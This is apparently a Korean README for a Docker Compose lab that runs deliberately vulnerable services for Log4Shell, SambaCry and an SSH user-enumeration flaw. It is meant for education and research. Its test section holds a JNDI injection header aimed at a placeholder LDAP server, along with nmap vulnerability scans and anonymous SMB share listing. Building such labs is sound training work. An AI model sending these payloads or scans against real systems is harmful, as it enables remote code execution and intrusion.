# vuln-lab 🔬

Docker Compose 기반 취약점 실습 환경. 세 가지 실제 CVE를 로컬에서 안전하게 분석할 수 있습니다.

## 포함된 취약점

| CVE | 이름 | CVSS | 접속 포트 |
|-----|------|------|-----------|
| CVE-2021-44228 | Log4Shell | 10.0 (Critical) | `localhost:9080` |
| CVE-2017-7494  | SambaCry  |  9.8 (Critical) | `localhost:9081` (웹 UI) / `1445` (SMB) |
| CVE-2018-15473 | SSH User Enumeration | 5.3 (Medium) | `localhost:9082` (웹 UI) / `2222` (SSH) |

## 빠른 시작

```bash
git clone https://github.com/s0yeon25/vuln-lab.git
cd vuln-lab
docker compose up --build -d
```

> 첫 실행 시 이미지 빌드에 몇 분 소요될 수 있습니다.

## 접속 주소

| 서비스 | 브라우저 접속 URL | 설명 |
|--------|------------------|------|
| Log4Shell | http://localhost:9080 | 취약한 Spring Boot 앱 |
| SambaCry UI | http://localhost:9081 | SMB 서비스 상태 및 분석 가이드 |
| SSH Enum UI | http://localhost:9082 | SSH 서비스 상태 및 분석 가이드 |

## 각 취약점 테스트

### Log4Shell (CVE-2021-44228)
```bash
# JNDI Lookup 트리거 (X-Api-Version 헤더 활용)
curl -H 'X-Api-Version: ${jndi:ldap://your-ldap-server/a}' http://localhost:9080/
```

### SambaCry (CVE-2017-7494)
```bash
# 공유 목록 확인
smbclient -L //localhost -p 1445 -N
# 공유 접속
smbclient //localhost/share -p 1445 -N
# nmap 취약점 스캔
nmap -p 1445 --script smb-vuln-cve-2017-7494 localhost
```

### SSH User Enumeration (CVE-2018-15473)
```bash
# SSH 접속 테스트
ssh -p 2222 testuser@localhost
# nmap 스캔
nmap -p 2222 --script ssh-auth-methods localhost
```

## 중지

```bash
docker compose down
```

## ⚠️ 주의사항

- 이 환경은 **교육/연구 목적**으로만 사용하세요.
- 외부 네트워크에 노출하지 마세요.
- 실제 운영 환경에서 사용 금지.
